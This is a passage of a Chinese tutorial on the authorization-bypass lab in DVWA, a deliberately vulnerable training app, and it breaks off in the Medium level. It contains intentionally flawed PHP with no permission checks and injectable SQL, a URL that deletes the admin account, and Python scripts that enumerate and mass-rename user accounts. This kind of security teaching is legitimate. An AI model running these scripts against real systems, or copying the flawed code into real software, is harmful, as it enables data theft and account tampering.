<h3 id="后端代码分析"><a href="#后端代码分析" class="headerlink" title="后端代码分析"></a>后端代码分析</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ★★★ Low难度：完全没有权限检查 ★★★</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查用户是否已登录</span></span><br><span class="line"><span class="comment">// dvwaCurrentUser() - 获取当前登录用户名</span></span><br><span class="line"><span class="variable">$currentUser</span> = <span class="title function_ invoke__">dvwaCurrentUser</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// ★★★ 问题：只检查是否登录，不检查权限级别 ★★★</span></span><br><span class="line"><span class="comment">// 任何已登录用户都可以访问</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$currentUser</span>) &#123;</span><br><span class="line">    <span class="comment">// 未登录，重定向到登录页</span></span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: login.php&quot;</span>);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取要查看的用户ID</span></span><br><span class="line"><span class="comment">// $_GET[&#x27;id&#x27;] - 从URL获取用户ID</span></span><br><span class="line"><span class="variable">$userId</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// ★★★ 危险操作1：不验证用户是否有权查看该用户 ★★★</span></span><br><span class="line"><span class="comment">// 问题：</span></span><br><span class="line"><span class="comment">// 1. 不检查当前用户是否是管理员</span></span><br><span class="line"><span class="comment">// 2. 不检查当前用户是否是该用户本人</span></span><br><span class="line"><span class="comment">// 3. 任何登录用户都可以查看任何用户的信息</span></span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;SELECT * FROM users WHERE user_id = &#x27;<span class="subst">$userId</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>], <span class="variable">$query</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$result</span> &amp;&amp; <span class="title function_ invoke__">mysqli_num_rows</span>(<span class="variable">$result</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="variable">$user</span> = <span class="title function_ invoke__">mysqli_fetch_assoc</span>(<span class="variable">$result</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 显示用户信息（包括敏感数据） ★★★</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;h2&gt;User Information&lt;/h2&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;User ID: &quot;</span> . <span class="variable">$user</span>[<span class="string">&#x27;user_id&#x27;</span>] . <span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Username: &quot;</span> . <span class="variable">$user</span>[<span class="string">&#x27;user&#x27;</span>] . <span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;First Name: &quot;</span> . <span class="variable">$user</span>[<span class="string">&#x27;first_name&#x27;</span>] . <span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Last Name: &quot;</span> . <span class="variable">$user</span>[<span class="string">&#x27;last_name&#x27;</span>] . <span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Avatar: &quot;</span> . <span class="variable">$user</span>[<span class="string">&#x27;avatar&#x27;</span>] . <span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br><span class="line">    <span class="comment">// ★★★ 甚至显示密码哈希！ ★★★</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Password Hash: &quot;</span> . <span class="variable">$user</span>[<span class="string">&#x27;password&#x27;</span>] . <span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ★★★ 危险操作2：管理员功能没有权限检查 ★★★</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>] == <span class="string">&#x27;delete&#x27;</span>) &#123;</span><br><span class="line">    <span class="variable">$deleteUserId</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;delete_id&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 问题：任何用户都可以删除任何用户 ★★★</span></span><br><span class="line">    <span class="comment">// 完全没有检查：</span></span><br><span class="line">    <span class="comment">// 1. 当前用户是否是管理员</span></span><br><span class="line">    <span class="comment">// 2. 是否可以删除该用户</span></span><br><span class="line">    <span class="variable">$query</span> = <span class="string">&quot;DELETE FROM users WHERE user_id = &#x27;<span class="subst">$deleteUserId</span>&#x27;&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>], <span class="variable">$query</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;User deleted successfully!&lt;/p&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ★★★ 危险操作3：修改用户信息没有权限检查 ★★★</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;update&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$updateUserId</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;user_id&#x27;</span>];</span><br><span class="line">    <span class="variable">$newUsername</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 问题：任何用户都可以修改任何用户的信息 ★★★</span></span><br><span class="line">    <span class="variable">$query</span> = <span class="string">&quot;UPDATE users SET user = &#x27;<span class="subst">$newUsername</span>&#x27; WHERE user_id = &#x27;<span class="subst">$updateUserId</span>&#x27;&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>], <span class="variable">$query</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;User updated successfully!&lt;/p&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>HTML表单：</strong></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 查看用户信息 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;GET&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span>&gt;</span>View User ID:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;id&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span>&gt;</span>View<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 删除用户 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;GET&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;action&quot;</span> <span class="attr">value</span>=<span class="string">&quot;delete&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span>&gt;</span>Delete User ID:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;delete_id&quot;</span> <span class="attr">value</span>=<span class="string">&quot;2&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span>&gt;</span>Delete<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 修改用户名 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span>&gt;</span>User ID:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;user_id&quot;</span> <span class="attr">value</span>=<span class="string">&quot;2&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span>&gt;</span>New Username:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">value</span>=<span class="string">&quot;hacked&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;update&quot;</span>&gt;</span>Update<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p><strong>核心问题：</strong></p>
<ol>
<li><strong>只检查认证，不检查授权</strong> - 登录即可访问所有功能</li>
<li><strong>不验证资源所有权</strong> - 任何用户可以访问任何用户数据</li>
<li><strong>管理功能无保护</strong> - 删除、修改功能没有权限检查</li>
<li><strong>可预测的ID</strong> - 用户ID是连续数字，易于枚举</li>
</ol>
<p><strong>权限模型缺失：</strong></p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">应该：</span><br><span class="line">用户A → 只能查看/修改自己的数据</span><br><span class="line">管理员 → 可以查看/修改所有用户数据</span><br><span class="line"></span><br><span class="line">实际：</span><br><span class="line">任何登录用户 → 可以查看<span class="regexp">/修改/</span>删除任何用户数据</span><br></pre></td></tr></table></figure>

<h3 id="攻击步骤"><a href="#攻击步骤" class="headerlink" title="攻击步骤"></a>攻击步骤</h3><h4 id="步骤1：水平越权-访问其他用户数据"><a href="#步骤1：水平越权-访问其他用户数据" class="headerlink" title="步骤1：水平越权 - 访问其他用户数据"></a>步骤1：水平越权 - 访问其他用户数据</h4><p><strong>攻击：查看其他用户信息</strong></p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">正常访问：?<span class="attribute">id</span>=1（查看自己的信息）</span><br><span class="line"></span><br><span class="line">攻击：</span><br><span class="line">?<span class="attribute">id</span>=2  → 查看用户<span class="attribute">ID</span>=2的信息</span><br><span class="line">?<span class="attribute">id</span>=3  → 查看用户<span class="attribute">ID</span>=3的信息</span><br><span class="line"><span class="built_in">..</span>.</span><br><span class="line"></span><br><span class="line">结果：可以看到所有用户的信息，包括密码哈希</span><br></pre></td></tr></table></figure>

<p><strong>使用Burp Suite枚举所有用户：</strong></p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">1.</span> 拦截请求：GET /vulnerabilities/authbypass/?id=1</span><br><span class="line"><span class="bullet">2.</span> 发送到Intruder</span><br><span class="line"><span class="bullet">3.</span> 设置Payload位置：?id=§1§</span><br><span class="line"><span class="bullet">4.</span> Payload类型：Numbers（1-100）</span><br><span class="line"><span class="bullet">5.</span> 开始攻击</span><br><span class="line"><span class="bullet">6.</span> 结果：获取所有用户的信息</span><br></pre></td></tr></table></figure>

<h4 id="步骤2：垂直越权-删除其他用户"><a href="#步骤2：垂直越权-删除其他用户" class="headerlink" title="步骤2：垂直越权 - 删除其他用户"></a>步骤2：垂直越权 - 删除其他用户</h4><p><strong>攻击：删除管理员账户</strong></p>
<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">普通用户登录后：</span><br><span class="line"></span><br><span class="line">访问：?action=delete&amp;delete_id=1</span><br><span class="line"></span><br><span class="line">结果：</span><br><span class="line"><span class="bullet">- </span>管理员账户被删除</span><br><span class="line"><span class="bullet">- </span>普通用户执行了管理员操作</span><br></pre></td></tr></table></figure>

<h4 id="步骤3：批量攻击"><a href="#步骤3：批量攻击" class="headerlink" title="步骤3：批量攻击"></a>步骤3：批量攻击</h4><p><strong>Python脚本 - 枚举所有用户：</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://dvwa.local/vulnerabilities/authbypass/&quot;</span></span><br><span class="line">cookies = &#123;</span><br><span class="line">    <span class="string">&#x27;security&#x27;</span>: <span class="string">&#x27;low&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;PHPSESSID&#x27;</span>: <span class="string">&#x27;your_session&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] Enumerating users...&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> user_id <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">    params = &#123;<span class="string">&#x27;id&#x27;</span>: user_id&#125;</span><br><span class="line">    response = requests.get(url, params=params, cookies=cookies)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;User ID:&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">        <span class="comment"># 提取用户信息</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[+] Found user ID: <span class="subst">&#123;user_id&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 解析用户名和密码哈希</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Username:&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            <span class="comment"># 提取信息（需要解析HTML）</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;    Details in response&quot;</span>)</span><br></pre></td></tr></table></figure>

<p><strong>Python脚本 - 批量修改用户：</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://dvwa.local/vulnerabilities/authbypass/&quot;</span></span><br><span class="line">cookies = &#123;</span><br><span class="line">    <span class="string">&#x27;security&#x27;</span>: <span class="string">&#x27;low&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;PHPSESSID&#x27;</span>: <span class="string">&#x27;your_session&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] Modifying all users...&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> user_id <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">10</span>):</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;user_id&#x27;</span>: user_id,</span><br><span class="line">        <span class="string">&#x27;username&#x27;</span>: <span class="string">f&#x27;hacked_<span class="subst">&#123;user_id&#125;</span>&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;update&#x27;</span>: <span class="string">&#x27;Update&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    response = requests.post(url, data=data, cookies=cookies)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;updated successfully&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[+] Modified user <span class="subst">&#123;user_id&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[-] Failed to modify user <span class="subst">&#123;user_id&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>

<h4 id="步骤4：查找隐藏的管理功能"><a href="#步骤4：查找隐藏的管理功能" class="headerlink" title="步骤4：查找隐藏的管理功能"></a>步骤4：查找隐藏的管理功能</h4><p><strong>目录枚举：</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用dirbuster或gobuster</span></span><br><span class="line">gobuster <span class="built_in">dir</span> -u http://dvwa.local/vulnerabilities/authbypass/ \</span><br><span class="line">             -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \</span><br><span class="line">             -c <span class="string">&quot;security=low; PHPSESSID=your_session&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 常见管理路径</span></span><br><span class="line">/admin</span><br><span class="line">/administrator</span><br><span class="line">/admin.php</span><br><span class="line">/manage</span><br><span class="line">/panel</span><br><span class="line">/dashboard</span><br></pre></td></tr></table></figure>

<p><strong>功能枚举：</strong></p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">尝试不同的action参数：</span><br><span class="line">?<span class="attribute">action</span>=delete</span><br><span class="line">?<span class="attribute">action</span>=update</span><br><span class="line">?<span class="attribute">action</span>=view</span><br><span class="line">?<span class="attribute">action</span>=export</span><br><span class="line">?<span class="attribute">action</span>=backup</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="Medium-难度"><a href="#Medium-难度" class="headerlink" title="Medium 难度"></a>Medium 难度</h2><h3 id="攻击目标-1"><a href="#攻击目标-1" class="headerlink" title="攻击目标"></a>攻击目标</h3><p>使用Referer检查，但可以伪造。</p>
<h3 id="后端代码分析-1"><a href="#后端代码分析-1" class="headerlink" title="后端代码分析"></a>后端代码分析</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取当前用户</span></span><br><span class="line"><span class="variable">$currentUser</span> = <span class="title function_ invoke__">dvwaCurrentUser</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$currentUser</span>) &#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: login.php&quot;</span>);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ★★★ 新增：检查Referer头 ★★★</span></span><br><span class="line"><span class="comment">// $_SERVER[&#x27;HTTP_REFERER&#x27;] - HTTP Referer头</span></span><br><span class="line"><span class="comment">// 作用：检查请求是否来自本站</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// 问题：</span></span><br><span class="line"><span class="comment">// 1. Referer可以被伪造</span></span><br><span class="line"><span class="comment">// 2. 某些浏览器/代理可能不发送Referer</span></span><br><span class="line"><span class="comment">// 3. 这不是可靠的安全检查</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_REFERER&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$referer</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_REFERER&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 检查Referer是否包含当前域名 ★★★</span></span><br><span class="line">    <span class="comment">// strpos() - 查找字符串位置</span></span><br><span class="line">    <span class="comment">// $_SERVER[&#x27;HTTP_HOST&#x27;] - 当前域名</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// 例如：</span></span><br><span class="line">    <span class="comment">// Referer: http://dvwa.local/vulnerabilities/authbypass/index.php</span></span><br><span class="line">    <span class="comment">// HTTP_HOST: dvwa.local</span></span><br><span class="line">    <span class="comment">// strpos() 找到 &quot;dvwa.local&quot; → 通过检查</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$referer</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_HOST&#x27;</span>]) === <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="comment">// Referer不包含当前域名，拒绝</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Access denied: Invalid referer&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// ★★★ 问题：没有Referer也拒绝 ★★★</span></span><br><span class="line">    <span class="comment">// 某些情况下，合法用户的浏览器可能不发送Referer</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Access denied: No referer&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ★★★ 新增：简单的角色检查 ★★★</span></span><br><span class="line"><span class="comment">// 检查用户是否有admin_role权限</span></span><br><span class="line"><span class="comment">// 但这个检查有漏洞</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isAdmin</span>(<span class="params"><span class="variable">$username</span></span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 从数据库查询用户角色</span></span><br><span class="line">    <span class="variable">$query</span> = <span class="string">&quot;SELECT * FROM users WHERE user = &#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>], <span class="variable">$query</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$result</span> &amp;&amp; <span class="title function_ invoke__">mysqli_num_rows</span>(<span class="variable">$result</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="variable">$user</span> = <span class="title function_ invoke__">mysqli_fetch_assoc</span>(<span class="variable">$result</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ★★★ 问题：角色信息存储在客户端可见的字段 ★★★</span></span><br><span class="line">        <span class="comment">// 如果avatar或其他字段包含&quot;admin&quot;字符串，就认为是管理员</span></span><br><span class="line">        <span class="comment">// 这是非常弱的检查</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$user</span>[<span class="string">&#x27;avatar&#x27;</span>], <span class="string">&#x27;admin&#x27;</span>) !== 